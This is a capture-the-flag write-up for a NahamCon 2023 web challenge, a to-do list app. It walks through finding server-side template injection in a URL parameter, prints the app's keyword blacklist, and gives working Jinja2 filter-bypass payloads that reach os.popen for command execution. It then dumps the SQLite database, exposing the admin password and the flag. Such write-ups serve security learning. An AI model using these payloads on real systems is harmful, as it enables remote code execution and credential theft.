>Author: @congon4tor#2334  
>  
>Every Capture the Flag competition has to have an obligatory to-do list application, right???
---------------------------------
Firstly, we are greeted with a sign-in page

![Pasted image 20230616165433.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616165433.png)

Typical admin:admin guesses do not work, so after making a new account

![Pasted image 20230616165611.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616165611.png)

I created a new task `asdf`, and this is the result. After exploring the POST parameters done during submission, as well as how things are altered when tasks are moved between active and completed, I did not see any interesting pattern. The most notable piece is that trashing my first task leads to `http://challenge.nahamcon.com:32053/delete?id=2`. However, `id=1` appears inaccessible. 

When I turned my attention to the greentext, I noticed in the url we see this as well:
`http://challenge.nahamcon.com:32053/?success=Task%20created`
Editing the success= component will affect what is being displayed in green. After playing for a bit, I noticed that this is actually vulnerable to SSTI:
`http://challenge.nahamcon.com:32053/?success={{7*7}}`

![Pasted image 20230616154856.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616154856.png)

Doing actions such as `curl -v` did not give any insight on the framework being used, but exploring the SSTI a little further gave me the impression that this is likely Jinja2:
`http://challenge.nahamcon.com:32053/?success={{7*'7'}}``

![Pasted image 20230616155028.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616155028.png)

Knowing this, I tried some simple enumerations before I find the true difficulty of this challenge:
`http://challenge.nahamcon.com:32053/?success={{config}}`

![Pasted image 20230616170342.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616170342.png)

```
HACKER DETECTED!!!!  
The folowing are not allowed: [ {{\s*config\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\..*,.*\[.*,.*\].*,.*\_\_.* ]
```

It wasn't obvious to me at first, but the real trouble is that any command containing a dot, or square brackets, is blocked.
After spending a good amount of time looking for ways to bypass the filter, I eventually ran into [this post](https://hackmd.io/@Chivato/HyWsJ31dI). Importantly, the writer manages to create a payload to bypass ".","\_", "[]", and even "|join". 

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Our blacklist also includes some functions that were used, which I bypassed by breaking between quotes (popen -> po''pen).

```
http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27id%27)|attr(%27read%27)()}}
```

![Pasted image 20230616171249.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616171249.png)

We have successful code execution!! Now all that remains is to find the flag.

After some enumeration of where the flag might be, I began to think that perhaps there isn't a `flag.txt` file after all. When I check the contents of the cwd:
```bash
drwxr-xr-x    1 root     root          4096 Jun 14 17:54 .
drwxr-xr-x    1 root     root          4096 Jun 14 17:54 ..
drwxr-xr-x    1 uwsgi    uwsgi         4096 Jun 16 20:55 DB
-rw-r--r--    1 root     root           159 Jun 14 17:53 app.ini
-rwxr-xr-x    1 root     root          6693 Jun 14 17:53 app.py
-rw-r--r--    1 root     root           792 Jun 14 17:53 models.py
-rw-r--r--    1 root     root           138 Jun 14 17:53 requirements.txt
drwxr-xr-x    2 root     root          4096 Jun 14 17:53 templates
```
I notice the DB folder, and I recall that my task id's started at 2. Perhaps the flag is in admin's task list, for id number 1?

Looking inside the DB folder:
```
drwxr-xr-x    1 uwsgi    uwsgi         4096 Jun 16 20:55 .
drwxr-xr-x    1 root     root          4096 Jun 14 17:54 ..
-rw-r--r--    1 uwsgi    uwsgi        16384 Jun 16 20:55 db.sqlite
```

Unfortunately, opening a sqlite file is a bit tricky with the RCE that I am currently using. Moreover, dots are still blacklisted. It is fortunate that this folder only has one file, so we can use wildcard * to select `db.sqlite` without using dot. When I try `cat /usr/src/app/DB/*`:

![Pasted image 20230616172048.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616172048.png)

It seems there are issues when trying to output invalid characters, causing the internal server error. As a last attempt, I decided to try `strings`, which should only output legitimate utf-8 friendly characters. However, it is not guaranteed that the flag could remain intact for this.

Request:
```
view-source:http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27strings%20/usr/src/app/DB/db*%27)|attr(%27read%27)()}}
```

Output:
```bash
tabletasktask
CREATE TABLE task (
	id INTEGER NOT NULL, 
	name VARCHAR(100), 
	completed BOOLEAN, 
	user_id INTEGER, 
	PRIMARY KEY (id), 
	CHECK (completed IN (0, 1)), 
	FOREIGN KEY(user_id) REFERENCES user (id)
tableuseruser
CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(40), 
	password VARCHAR(50), 
	PRIMARY KEY (id), 
	UNIQUE (username)
indexsqlite_autoindex_user_1user
asdfasdf
-adminT2dUL6Z#S9KH%x%i
asdf
	admin
asdf
	flag{7b5b91c60796488148ddf3b227735979}
```

Very foturnately, the flag not only survived but is very readable!
`flag{7b5b91c60796488148ddf3b227735979}`

As a side note, we have the password for `admin` now too, and can log in.
`admin:T2dUL6Z#S9KH%x%i`

![Pasted image 20230616172852.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616172852.png)

